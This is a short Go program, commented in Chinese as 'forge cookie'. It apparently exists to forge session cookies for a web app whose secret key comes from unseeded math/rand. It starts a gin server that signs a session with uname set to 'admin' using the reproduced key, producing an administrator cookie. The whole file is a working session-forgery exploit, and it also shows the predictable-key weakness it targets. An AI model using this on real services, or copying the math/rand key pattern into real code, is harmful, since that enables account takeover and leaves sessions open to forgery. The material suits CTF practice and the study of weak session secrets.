// 伪造 cookie
package main

import (
	"math/rand"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	storage := cookie.NewStore(randomChar(16))
	r.Use(sessions.Sessions("o", storage))
	r.GET("/a", cookieHandler)
	r.Run("0.0.0.0:8000")
}
func cookieHandler(c *gin.Context) {
	s := sessions.Default(c)
	s.Set("uname", "admin")
	s.Save()
}
func randomChar(l int) []byte {
	output := make([]byte, l)
	rand.Read(output)
	return output
}
